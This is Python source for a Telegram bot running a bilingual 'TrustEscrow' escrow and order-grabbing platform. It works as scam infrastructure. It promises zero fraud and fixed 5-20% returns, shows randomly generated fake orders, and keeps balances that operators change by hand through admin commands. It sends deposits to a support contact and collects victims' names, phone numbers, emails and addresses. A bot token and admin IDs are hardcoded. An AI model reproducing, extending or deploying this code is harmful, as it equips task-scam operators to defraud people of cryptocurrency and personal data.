# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
import random
import time
import threading
import os
from flask import Flask

# ===================== 核心配置 =====================
# 新机器人的最新有效 Token（已填好，无需修改）
BOT_TOKEN = "8747514402:AAF5iwtbxAvmt07jiyHg1XPt2jgBrzlKa_Y"
ADMIN_IDS = [878108205, 825605508]
VIRTUAL_ORDER_REFRESH_SECONDS = 120
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 防Railway杀进程 =====================
app = Flask(__name__)
@app.route('/')
def home():
    return "Bot is running!", 200

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ===================== 虚拟订单全局 =====================
virtual_orders = []

def refresh_virtual_orders():
    global virtual_orders
    while True:
        virtual_orders = []
        for i in range(6):
            vid = 101 + i
            amt = round(random.uniform(10, 100), 2)
            virtual_orders.append({"id": vid, "amount": amt})
        time.sleep(VIRTUAL_ORDER_REFRESH_SECONDS)

# ===================== 双语文案 =====================
TEXT = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報

客服：@fcff88""",

        "reg_form": """📝 入駐擔保申請
請依序填寫真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID""",

        "reg_success": "✅ 入駐申請已提交，等待管理員審核",
        "reg_error": "❌ 格式錯誤，請按要求一次性發送完整5項信息",

        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 餘額：{:.2f} USDT
📌 狀態：{}

⏳ 未完成訂單：
{}
✅ 已完成訂單：
{}""",

        "grab": """🚀 搶單大廳（每2分鐘自動刷新）
點擊按鈕直接搶單：

{}""",

        "grab_success": "✅ 搶單成功，請接單",
        "grab_already_gone": "❌ 訂單已被搶走",

        "deposit": """💰 儲值 & 提現
請聯繫官方客服：
➡️ @fcff88""",

        "record": """📜 擔保記錄
{}""",

        "account_detail": """📋 資金明細
🆔 用戶ID：{}
💰 當前餘額：{:.2f} USDT

💸 資金流水：
{}

📦 所有訂單：
{}""",

        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",
        "status_canceled": "已取消",

        "accept_success": "✅ 接單成功，已扣除金額",
        "not_enough": "❌ 餘額不足",
        "not_verified": "❌ 未通過審核",
        "no_detail": "❌ 你尚未填寫入駐信息",
        "banned": "❌ 你已被封禁",

        "btn_back": "返回首頁",
        "btn_accept": "接單",
        "btn_grab": "搶單"
    },
    "en": {
        "home": """🏆 TrustEscrow Premium Platform
Safe, Stable, Secure

✅ 5 Years 0 Fraud
✅ 100% Safe Escrow
✅ 5% Grab Profit
✅ 15-20% Assign Profit

Support: @fcff88""",

        "reg_form": """📝 Escrow Registration
Fill in your real info:
1. Full Name
2. Phone Number
3. Email
4. Address
5. Referrer ID""",

        "reg_success": "✅ Application Submitted, Waiting for Review",
        "reg_error": "❌ Format Error, Please send all 5 items correctly",

        "profile": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USDT
📌 Status: {}

⏳ Pending Orders:
{}
✅ Completed Orders:
{}""",

        "grab": """🚀 Grab Hall (Auto-refresh every 2min)
Click button to grab order:

{}""",

        "grab_success": "✅ Order Grabbed, Please Accept",
        "grab_already_gone": "❌ Order Already Taken",

        "deposit": """💰 Deposit & Withdraw
Contact support: @fcff88""",

        "record": """📜 Escrow Record
{}""",

        "account_detail": """📋 Fund Detail
🆔 ID: {}
💰 Balance: {:.2f} USDT

💸 Flow:
{}

📦 All Orders:
{}""",

        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",
        "status_canceled": "Canceled",

        "accept_success": "✅ Order Accepted, Amount Deducted",
        "not_enough": "❌ Insufficient Balance",
        "not_verified": "❌ Not Verified",
        "no_detail": "❌ You have not submitted registration",
        "banned": "❌ You are banned",

        "btn_back": "Home",
        "btn_accept": "Accept",
        "btn_grab": "Grab"
    }
}

# ===================== 数据存储 =====================
user_lang = {}
user_balance = {}
user_verify = {}
user_info = {}
orders = {}
order_id = 101
last_msg = {}
user_applying = {}

# 🔥 新增：资金流水 / 封禁用户
user_flow = {}
user_banned = {}

# ===================== 菜单 =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保" if lang == "zh" else "Register", callback_data="reg"),
        InlineKeyboardButton("個人中心" if lang == "zh" else "Profile", callback_data="profile"),
        InlineKeyboardButton("賬號明細" if lang == "zh" else "Account Detail", callback_data="detail"),
        InlineKeyboardButton("搶單大廳" if lang == "zh" else "Grab", callback_data="grab"),
        InlineKeyboardButton("儲值提現" if lang == "zh" else "Deposit", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄" if lang == "zh" else "Record", callback_data="record"),
        InlineKeyboardButton("🌐 English" if lang == "zh" else "🌐 繁中", callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(TEXT[lang]["btn_back"], callback_data="home"))
    return m

def accept_btn(oid, user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(TEXT[lang]["btn_accept"], callback_data=f"acc_{oid}"))
    m.add(InlineKeyboardButton(TEXT[lang]["btn_back"], callback_data="profile"))
    return m

# ===================== 通知管理员 =====================
def notify_admins(text):
    for admin in ADMIN_IDS:
        try:
            bot.send_message(admin, text)
        except Exception as e:
            print(f"通知管理员失败: {e}")

# ===================== /start =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_info.setdefault(u, {})
    user_applying[u] = False
    user_flow.setdefault(u, [])
    user_banned.setdefault(u, False)

    lang = user_lang[u]
    if user_banned[u]:
        bot.send_message(u, TEXT[lang]["banned"])
        return

    sent = bot.send_message(u, TEXT[lang]["home"], reply_markup=main_menu(u))
    last_msg[u] = sent.message_id

# ===================== 按钮回调 =====================
@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    mid = c.message.message_id
    cid = c.message.chat.id
    last_msg[u] = mid

    # 封禁判断
    if user_banned.get(u, False):
        bot.answer_callback_query(c.id, t["banned"], show_alert=True)
        return

    try:
        if c.data == "home":
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "reg":
            if user_verify.get(u, 0) != 0:
                bot.answer_callback_query(c.id, TEXT["zh"]["reg_success"] if user_verify[u] == 1 else "❌ 已通過審核", show_alert=True)
                return
            user_applying[u] = True
            bot.edit_message_text(t["reg_form"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "detail":
            bal = user_balance.get(u, 0.0)
            flows = user_flow.get(u, [])
            flow_text = "\n".join(flows) if flows else ("無記錄" if lang == "zh" else "No Records")

            my_orders = [o for o in orders.items() if o[1]["user"] == u]
            order_lines = []
            for oid, o in my_orders:
                typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
                sta_map = {0: t["status_wait"], 1: t["status_doing"], 2: t["status_done"], 3: t["status_canceled"]}
                sta = sta_map.get(o["status"], t["status_wait"])
                profit = round(o["amount"]*(0.05 if o["type"] == "grab" else random.uniform(0.15,0.2)), 2)
                order_lines.append(f"#{oid} {typ} {o['amount']} USDT +{profit} | {sta}")

            order_text = "\n".join(order_lines) if order_lines else ("無訂單記錄" if lang == "zh" else "No Orders")
            text = t["account_detail"].format(u, bal, flow_text, order_text)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    typ = "派單" if o["type"] == "assign" else "搶單" if lang == "zh" else "Assign" if o["type"] == "assign" else "Grab"
                    s_map = {0:t["status_wait"],1:t["status_doing"],2:t["status_done"],3:t["status_canceled"]}
                    s = s_map.get(o["status"], t["status_wait"])
                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}"
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            v = user_verify.get(u,0)
            status = "未申請" if v==0 else "審核中" if v==1 else "已通過" if lang=="zh" else \
                    "Not Applied" if v==0 else "Pending" if v==1 else "Verified"
            p_text = "\n".join(pending) if pending else ("無" if lang=="zh" else "None")
            c_text = "\n".join(completed) if completed else ("無" if lang=="zh" else "None")
            text = t["profile"].format(u, user_balance.get(u,0), status, p_text, c_text)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "grab":
            if user_verify.get(u,0) != 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            items = []
            m = InlineKeyboardMarkup(row_width=2)
            for vo in virtual_orders:
                profit = round(vo["amount"]*0.05,2)
                items.append(f"#{vo['id']} {vo['amount']} USDT +{profit}")
                btn_text = f"搶{vo['id']}" if lang=="zh" else f"Grab {vo['id']}"
                m.add(InlineKeyboardButton(btn_text, callback_data=f"grab_item_{vo['id']}"))
            m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
            text = t["grab"].format("\n".join(items))
            bot.edit_message_text(text, cid, mid, reply_markup=m)

        elif c.data.startswith("grab_item_"):
            if user_verify.get(u,0) !=2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            vid = int(c.data.split("_")[-1])
            hit = next((x for x in virtual_orders if x["id"]==vid), None)
            if not hit:
                bot.send_message(u, t["grab_already_gone"])
                return
            global order_id
            oid = order_id
            order_id +=1
            orders[oid] = {"user":u, "amount":hit["amount"], "type":"grab", "status":0}
            profit = round(hit["amount"]*0.05,2)
            if lang=="zh":
                st = f"✅ 搶單成功 #{oid}\n本金：{hit['amount']} USDT\n利潤：+{profit} USDT"
            else:
                st = f"✅ Order Grabbed #{oid}\nAmount: {hit['amount']} USDT\nProfit: +{profit} USDT"
            bot.edit_message_text(st, cid, mid, reply_markup=accept_btn(oid,u))

        elif c.data.startswith("acc_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"]!=u or o["status"]!=0:
                bot.answer_callback_query(c.id, "❌ 無效訂單" if lang=="zh" else "❌ Invalid Order", show_alert=True)
                return
            if user_balance.get(u,0) < o["amount"]:
                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.edit_message_text(t["accept_success"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "deposit":
            bot.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s_map = {0:t["status_wait"],1:t["status_doing"],2:t["status_done"],3:t["status_canceled"]}
                    s = s_map.get(o["status"], t["status_wait"])
                    typ = "派單" if o["type"]=="assign" else "搶單" if lang=="zh" else "Assign" if o["type"]=="assign" else "Grab"
                    lines.append(f"• #{oid} {typ} {o['amount']} USDT | {s}")
            text = t["record"].format("\n".join(lines) if lines else ("無記錄" if lang=="zh" else "No Records"))
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(c.id)

# ===================== 用户申请 =====================
@bot.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS)
def user_input(msg):
    u = msg.from_user.id
    if user_banned.get(u, False):
        return
    txt = msg.text.strip()
    lang = user_lang.get(u,"zh")
    t = TEXT[lang]
    user_applying.setdefault(u,False)
    if not user_applying[u]:
        return

    pattern = r"1\.?\s*真實姓名\s*(.+?)\s*2\.?\s*聯絡電話\s*(.+?)\s*3\.?\s*電子信箱\s*(.+?)\s*4\.?\s*居住地址\s*(.+?)\s*5\.?\s*推薦人ID\s*(.+)"
    match = re.search(pattern, txt, re.DOTALL)
    if match:
        user_info[u] = {
            "name": match.group(1).strip(),
            "phone": match.group(2).strip(),
            "email": match.group(3).strip(),
            "addr": match.group(4).strip(),
            "ref": match.group(5).strip()
        }
        user_verify[u] = 1
        user_applying[u] = False
        notify_admins(f"📥 新入駐申請\n用戶ID：{u}\n姓名：{user_info[u]['name']}\n電話：{user_info[u]['phone']}")
        mid = last_msg.get(u)
        if mid:
            bot.edit_message_text(t["reg_success"], msg.chat.id, mid, reply_markup=main_menu(u))
    else:
        mid = last_msg.get(u)
        if mid:
            bot.edit_message_text(t["reg_error"], msg.chat.id, mid, reply_markup=back_menu(u))

# ===================== 管理员命令（完整版新增） =====================
@bot.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS)
def admin_cmd(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    arr = txt.split()
    try:
        # 1. 通过
        if len(arr)>=2 and arr[0] in ["通过","审核通过"]:
            target = int(arr[1])
            user_verify[target] = 2
            bot.send_message(u, f"✅ 已通過用戶 {target}")
            return

        # 2. 查ID
        if len(arr)>=2 and arr[0] == "查ID":
            target = int(arr[1])
            bal = user_balance.get(target,0.0)
            my_orders = [o for o in orders.items() if o[1]["user"]==target]
            text = f"📋 用戶 {target}\n💰 餘額：{bal:.2f} USDT\n\n"
            if not my_orders:
                text += "無訂單"
            else:
                for oid,o in my_orders:
                    typ = "派單" if o["type"]=="assign" else "搶單"
                    sta_map = {0:"待接單",1:"已接單",2:"已完成",3:"已取消"}
                    sta = sta_map.get(o["status"],"未知")
                    profit = round(o["amount"]*(0.05 if o["type"]=="grab" else random.uniform(0.15,0.2)),2)
                    text += f"#{oid} {typ} {o['amount']} USDT +{profit} | {sta}\n"
            bot.send_message(u, text)
            return

        # 3. +U
        if txt.startswith("+U "):
            if len(arr)==3:
                uid = int(arr[1])
                amt = float(arr[2])
                user_balance[uid] = user_balance.get(uid,0.0)+amt
                user_flow.setdefault(uid, []).append(f"+{amt:.2f} USDT  管理員充值")
                bot.send_message(u, f"✅ +{amt:.2f} USDT → {uid}｜餘額：{user_balance[uid]:.2f}")
            return

        # 4. -U
        if txt.startswith("-U "):
            if len(arr)==3:
                uid = int(arr[1])
                amt = float(arr[2])
                cur = user_balance.get(uid,0.0)
                user_balance[uid] = max(0.0, cur-amt)
                user_flow.setdefault(uid, []).append(f"-{amt:.2f} USDT  管理員扣除")
                bot.send_message(u, f"✅ -{amt:.2f} USDT → {uid}｜餘額：{user_balance[uid]:.2f}")
            return

        # 5. 派单
        if arr[0]=="派单" and len(arr)==3:
            target = int(arr[1])
            amt = float(arr[2])
            global order_id
            oid = order_id
            order_id +=1
            orders[oid] = {"user":target,"amount":amt,"type":"assign","status":0}
            profit = round(amt*random.uniform(0.15,0.2),2)
            bot.send_message(u, f"✅ 派單成功 #{oid} → {target}")
            mark = InlineKeyboardMarkup()
            mark.add(InlineKeyboardButton("接單", callback_data=f"acc_{oid}"))
            try:
                bot.send_message(target, f"📢 新派單 #{oid}\n本金：{amt} USDT\n利潤：+{profit} USDT", reply_markup=mark)
            except:
                pass
            return

        # 6. 完成
        if arr[0]=="完成" and len(arr)==2:
            oid = int(arr[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 訂單不存在")
                return
            o["status"] = 2
            profit = o["amount"]*(0.05 if o["type"]=="grab" else random.uniform(0.15,0.2))
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, f"✅ 訂單 #{oid} 已完成")
            return

        # 🔥 7. 取消订单（智能退本金）
        if arr[0]=="取消订单" and len(arr)==2:
            oid = int(arr[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 訂單不存在")
                return
            if o["status"] == 3:
                bot.send_message(u, "❌ 已取消過")
                return

            # 已接单 = 扣过钱 → 退回
            if o["status"] == 1:
                user_balance[o["user"]] += o["amount"]
                user_flow.setdefault(o["user"], []).append(f"+{o['amount']:.2f} USDT  取消訂單退款")
                o["status"] = 3
                bot.send_message(u, f"✅ 已取消 #{oid}，已退回本金 {o['amount']} USDT")
            else:
                o["status"] = 3
                bot.send_message(u, f"✅ 已取消 #{oid}（未支付，無退款）")
            return

        # 🔥 8. 封ID
        if arr[0]=="封ID" and len(arr)==2:
            target = int(arr[1])
            user_banned[target] = True
            bot.send_message(u, f"✅ 已封禁用戶 {target}")
            return

        # 🔥 9. 解ID
        if arr[0]=="解ID" and len(arr)==2:
            target = int(arr[1])
            user_banned[target] = False
            bot.send_message(u, f"✅ 已解除封禁 {target}")
            return

        bot.send_message(u, (
            "❌ 指令格式：\n"
            "通过 ID\n"
            "查ID ID\n"
            "+U ID 金額\n"
            "-U ID 金額\n"
            "派单 ID 金額\n"
            "完成 訂單號\n"
            "取消订单 訂單號\n"
            "封ID ID\n"
            "解ID ID"
        ))
    except Exception as e:
        print(f"Admin error: {e}")
        bot.send_message(u, "❌ 指令格式錯誤")

# ===================== 启动 =====================
if __name__ == "__main__":
    threading.Thread(target=refresh_virtual_orders, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()
    print("✅ 机器人启动成功")
    bot.infinity_polling()
